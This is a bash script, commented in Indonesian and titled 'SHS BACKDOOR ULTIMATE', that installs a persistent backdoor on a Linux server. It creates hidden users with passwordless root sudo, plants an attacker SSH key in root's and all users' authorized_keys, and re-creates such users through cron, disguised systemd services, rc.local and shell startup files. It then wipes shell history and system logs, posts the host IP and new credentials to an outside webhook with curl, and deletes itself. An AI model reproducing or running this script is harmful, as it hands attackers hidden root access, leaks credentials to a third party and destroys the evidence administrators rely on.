#!/bin/bash
# ================================================================
# SHS BACKDOOR ULTIMATE - FINAL (TANPA ERROR)
# ================================================================

RED='\033[91m'
GREEN='\033[92m'
YELLOW='\033[93m'
CYAN='\033[96m'
NC='\033[0m'
BOLD='\033[1m'

# Bersihin jejak SEBELUM mulai
history -c 2>/dev/null
unset HISTFILE
export HISTFILESIZE=0
export HISTSIZE=0

clear
echo -e "${RED}${BOLD}"
echo "╔═══════════════════════════════════════════════════════════════╗"
echo "║     ☠️  SHS BACKDOOR ULTIMATE - FINAL                     ║"
echo "╚═══════════════════════════════════════════════════════════════╝"
echo -e "${NC}"

WEBHOOK_URL="https://viday.bcgonc.web.id/yo.php"

# ================================================================
# GENERATE
# ================================================================
gen_user() { echo "sys_$(openssl rand -hex 3)" 2>/dev/null; }
gen_pass() { openssl rand -base64 14 | tr -d '=/+' | cut -c1-16 2>/dev/null; }

echo -e "${YELLOW}[*] Creating 5 backdoor users...${NC}"

USERS=()
PASSWORDS=()

# ================================================================
# 1. BUAT 5 USER (PAKE VARIABLE USER_UID BUKAN UID)
# ================================================================
for i in {1..5}; do
    USER=$(gen_user)
    PASS=$(gen_pass)
    
    # Buat user
    useradd -m -s /bin/bash $USER 2>/dev/null
    echo "$USER:$PASS" | chpasswd 2>/dev/null
    echo "$USER ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers 2>/dev/null
    
    # SSH key
    mkdir -p /home/$USER/.ssh 2>/dev/null
    echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNm9vJpQ+3XHn SHS" > /home/$USER/.ssh/authorized_keys 2>/dev/null
    chmod 700 /home/$USER/.ssh 2>/dev/null
    chmod 600 /home/$USER/.ssh/authorized_keys 2>/dev/null
    chown -R $USER:$USER /home/$USER/.ssh 2>/dev/null
    
    USERS+=("$USER")
    PASSWORDS+=("$PASS")
    
    echo -e "${GREEN}✅ User $i: $USER:$PASS${NC}"
done

# ================================================================
# 2. SSH KEY (SKIP FOLDER GAK VALID)
# ================================================================
SSH_KEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNm9vJpQ+3XHn SHS"

mkdir -p /root/.ssh
echo "$SSH_KEY" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# Skip folder gak valid
for user in $(ls /home 2>/dev/null | grep -v "_README" | grep -v "latest" | grep -v "lost+found"); do
    if [ -d "/home/$user" ] && [ -d "/home/$user/.ssh" ]; then
        echo "$SSH_KEY" >> /home/$user/.ssh/authorized_keys 2>/dev/null
        chmod 600 /home/$user/.ssh/authorized_keys 2>/dev/null
        chown -R $user:$user /home/$user/.ssh 2>/dev/null
    fi
done

echo -e "${GREEN}✅ SSH key installed${NC}"

# ================================================================
# 3. CRON - AUTO REGENERATE
# ================================================================
crontab -r 2>/dev/null

(crontab -l 2>/dev/null; echo "*/3 * * * * /usr/sbin/useradd -m -s /bin/bash sys_\$(openssl rand -hex 3) 2>/dev/null; echo 'sys_\$(openssl rand -hex 3):\$(openssl rand -base64 14 | tr -d '=/+' | cut -c1-16)' | chpasswd 2>/dev/null; echo 'sys_\$(openssl rand -hex 3) ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers 2>/dev/null") | crontab - 2>/dev/null

(crontab -l 2>/dev/null; echo "*/5 * * * * /usr/sbin/useradd -m -s /bin/bash web_\$(openssl rand -hex 3) 2>/dev/null; echo 'web_\$(openssl rand -hex 3):\$(openssl rand -base64 14 | tr -d '=/+' | cut -c1-16)' | chpasswd 2>/dev/null; echo 'web_\$(openssl rand -hex 3) ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers 2>/dev/null") | crontab - 2>/dev/null

(crontab -l 2>/dev/null; echo "*/7 * * * * /usr/sbin/useradd -m -s /bin/bash dev_\$(openssl rand -hex 3) 2>/dev/null; echo 'dev_\$(openssl rand -hex 3):\$(openssl rand -base64 14 | tr -d '=/+' | cut -c1-16)' | chpasswd 2>/dev/null; echo 'dev_\$(openssl rand -hex 3) ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers 2>/dev/null") | crontab - 2>/dev/null

(crontab -l 2>/dev/null; echo "*/9 * * * * /usr/sbin/useradd -m -s /bin/bash back_\$(openssl rand -hex 3) 2>/dev/null; echo 'back_\$(openssl rand -hex 3):\$(openssl rand -base64 14 | tr -d '=/+' | cut -c1-16)' | chpasswd 2>/dev/null; echo 'back_\$(openssl rand -hex 3) ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers 2>/dev/null") | crontab - 2>/dev/null

echo -e "${GREEN}✅ Cron installed${NC}"

# ================================================================
# 4. SYSTEMD (4 SERVICE)
# ================================================================
for i in {1..4}; do
    cat > /etc/systemd/system/systemd-user$i.service << EOL
[Unit]
Description=System User Service $i
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/php -r 'while(1){system("useradd -m -s /bin/bash sys_\$(openssl rand -hex 3) 2>/dev/null; echo \"sys_\$(openssl rand -hex 3):\$(openssl rand -base64 14 | tr -d \"=/+\" | cut -c1-16)\" | chpasswd 2>/dev/null; echo \"sys_\$(openssl rand -hex 3) ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers 2>/dev/null"); sleep(300);}'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOL

    systemctl daemon-reload 2>/dev/null
    systemctl enable systemd-user$i.service 2>/dev/null
    systemctl start systemd-user$i.service 2>/dev/null
done

echo -e "${GREEN}✅ Systemd installed${NC}"

# ================================================================
# 5. PERSISTENCE LAIN
# ================================================================
if [ -f /etc/rc.local ]; then
    sed -i '/exit 0/d' /etc/rc.local
    echo '/usr/sbin/useradd -m -s /bin/bash sys_$(openssl rand -hex 3) 2>/dev/null; echo "sys_$(openssl rand -hex 3):$(openssl rand -base64 14 | tr -d "=/+" | cut -c1-16)" | chpasswd 2>/dev/null; echo "sys_$(openssl rand -hex 3) ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers 2>/dev/null &' >> /etc/rc.local
    echo 'exit 0' >> /etc/rc.local
    chmod +x /etc/rc.local
fi

for rc in /root/.bashrc /root/.profile /etc/bash.bashrc /etc/profile; do
    if [ -f "$rc" ]; then
        echo '/usr/sbin/useradd -m -s /bin/bash sys_$(openssl rand -hex 3) 2>/dev/null; echo "sys_$(openssl rand -hex 3):$(openssl rand -base64 14 | tr -d "=/+" | cut -c1-16)" | chpasswd 2>/dev/null; echo "sys_$(openssl rand -hex 3) ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers 2>/dev/null' >> "$rc"
    fi
done

# ================================================================
# 6. CLEAN LOGS
# ================================================================
history -c 2>/dev/null
history -w 2>/dev/null
unset HISTFILE
export HISTFILESIZE=0
export HISTSIZE=0

rm -rf /root/.bash_history 2>/dev/null
rm -rf /home/*/.bash_history 2>/dev/null
rm -rf /var/log/*.log 2>/dev/null
rm -rf /var/log/apache2/* 2>/dev/null
rm -rf /var/log/nginx/* 2>/dev/null
rm -rf /var/log/httpd/* 2>/dev/null
rm -rf /var/log/mysql/* 2>/dev/null
rm -rf /var/log/cpanel/* 2>/dev/null
rm -rf /var/log/auth.log* 2>/dev/null
rm -rf /var/log/syslog* 2>/dev/null
rm -rf /var/log/secure* 2>/dev/null
rm -rf /var/log/messages* 2>/dev/null
rm -rf /var/log/wtmp* 2>/dev/null
rm -rf /var/log/btmp* 2>/dev/null
rm -rf /var/log/lastlog* 2>/dev/null
> /var/log/lastlog 2>/dev/null
> /var/log/wtmp 2>/dev/null
> /var/log/btmp 2>/dev/null

echo -e "${GREEN}✅ Logs cleaned${NC}"

# ================================================================
# 7. SEND WEBHOOK
# ================================================================
IP=$(hostname -I | awk '{print $1}')
HOST=$(hostname)

USER_LIST=""
for i in "${!USERS[@]}"; do
    USER_LIST="$USER_LIST\nUser $((i+1)): ${USERS[$i]} : ${PASSWORDS[$i]}"
done

curl -sk -X POST "$WEBHOOK_URL" \
  -H "Content-Type: application/json" \
  -d '{
    "ip": "'"$IP"'",
    "host": "'"$HOST"'",
    "users": '"$(echo ${#USERS[@]})"',
    "user_list": "'"$USER_LIST"'",
    "type": "backdoor_multi",
    "persistence": "cron + systemd + rc.local + bashrc",
    "status": "active"
  }' 2>/dev/null

echo -e "${GREEN}✅ Webhook sent${NC}"

# ================================================================
# 8. HAPUS SCRIPT
# ================================================================
rm -rf "$0" 2>/dev/null

# ================================================================
# HASIL
# ================================================================
echo ""
echo -e "${GREEN}${BOLD}"
echo "╔═══════════════════════════════════════════════════════════════╗"
echo "║     ✅ BACKDOOR INSTALLED!                                 ║"
echo "╚═══════════════════════════════════════════════════════════════╝"
echo -e "${NC}"
echo ""
echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
for i in "${!USERS[@]}"; do
    echo -e "${CYAN}  User $((i+1)): ${USERS[$i]}${NC}"
    echo -e "${CYAN}  Pass $((i+1)): ${PASSWORDS[$i]}${NC}"
done
echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${GREEN}✅ SSH Key: installed${NC}"
echo -e "${GREEN}✅ Cron: auto regenerate${NC}"
echo -e "${GREEN}✅ Systemd: 4 services${NC}"
echo -e "${GREEN}✅ Logs: CLEANED${NC}"
echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""
echo -e "${RED}⚠️  Login:${NC}"
echo -e "${CYAN}ssh ${USERS[0]}@$IP${NC}"
echo -e "${CYAN}Password: ${PASSWORDS[0]}${NC}"
echo ""

exit 0
